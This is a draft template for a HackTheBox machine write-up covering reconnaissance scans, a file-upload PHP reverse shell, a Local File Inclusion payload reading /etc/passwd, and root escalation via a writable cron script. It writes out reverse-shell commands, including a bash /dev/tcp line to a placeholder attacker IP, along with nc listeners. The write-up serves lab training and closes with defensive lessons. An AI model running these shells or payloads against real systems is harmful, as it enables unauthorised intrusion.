---
title: "HTB: Sample Machine"
description: "Template for HackTheBox machine writeups."
summary: "Template for HackTheBox machine writeups."
date: 2025-07-23
draft: true
tags: ["htb", "linux", "web", "privilege-escalation"]
difficulty: "medium"
platform: "linux"
---

## Generic Information

**Name of the Machine**: Sample Machine  
**Machine IP**: 10.10.10.XXX  
**Operating System**: Linux  
**Difficulty**: Medium  
**Publication Date**: July 23, 2025  

---

## Reconnaissance - Enumeration

### Service Scan
```bash
nmap -sCV -vv 10.10.10.XXX
```

Key findings from the service scan:
- Port 22: SSH OpenSSH 8.2p1
- Port 80: HTTP Apache 2.4.41
- Port 443: HTTPS Apache 2.4.41

### All Ports Scan
```bash
nmap -sS -T4 -p- -vv 10.10.10.XXX
```

Additional ports discovered:
- Port 8080: HTTP Alternative service

### Directory Busting
```bash
gobuster dir -w /usr/share/dirbuster/directory-list-2.3-small.txt -u http://sample.htb/ -t 20
```

Interesting directories found:
- /admin
- /uploads
- /backup

### Subdomain Enumeration
```bash
ffuf -w /usr/share/wordlists/discovery/subdomains-top1million-20000.txt -u http://sample.htb -H "Host: FUZZ.sample.htb"
```

Subdomains discovered:
- admin.sample.htb
- api.sample.htb

---

## Exploit #1 - Web Application Vulnerability

### Initial Access Vector

The web application running on port 80 contains a file upload vulnerability that allows arbitrary file upload without proper validation.

**Steps:**
1. Navigate to `/uploads` endpoint
2. Upload a PHP reverse shell disguised as an image
3. Access the uploaded file to trigger the shell

```bash
# Generate reverse shell
msfvenom -p php/reverse_php LHOST=10.10.14.XXX LPORT=4444 -f raw > shell.php

# Set up listener
nc -lvnp 4444
```

### Exploitation Process

1. **File Upload Bypass**: Modified the Content-Type header to `image/jpeg`
2. **Shell Execution**: Accessed `http://sample.htb/uploads/shell.php`
3. **Initial Foothold**: Gained access as `www-data` user

---

## Exploit #2 - Local File Inclusion

### Vulnerability Analysis

The application's file parameter is vulnerable to Local File Inclusion (LFI), allowing access to sensitive system files.

**Payload:**
```
http://sample.htb/index.php?file=../../../../etc/passwd
```

### Information Gathering

Through LFI, discovered:
- User accounts in `/etc/passwd`
- SSH keys in `/home/user/.ssh/`
- Application configuration files

---

## Privilege Escalation

### Enumeration

After gaining initial access, performed standard privilege escalation enumeration:

```bash
# Check sudo permissions
sudo -l

# Look for SUID binaries
find / -perm -4000 2>/dev/null

# Check for interesting files
find / -name "*.conf" -type f 2>/dev/null
```

### Escalation Vector

Discovered that the `backup` script runs as root via cron job and is writable by the current user.

**Steps:**
1. Modify the backup script to include a reverse shell
2. Wait for the cron job to execute
3. Receive root shell

```bash
# Add to backup script
echo 'bash -i >& /dev/tcp/10.10.14.XXX/5555 0>&1' >> /opt/backup.sh

# Set up listener
nc -lvnp 5555
```

## Key Takeaways

1. **File Upload Security**: Always validate file types and contents, not just extensions
2. **Input Validation**: Properly sanitize user input to prevent LFI attacks
3. **Privilege Management**: Regularly audit file permissions and cron jobs
4. **Defense in Depth**: Multiple security layers could have prevented this compromise

---

*This writeup demonstrates common web application vulnerabilities and privilege escalation techniques for educational purposes.*
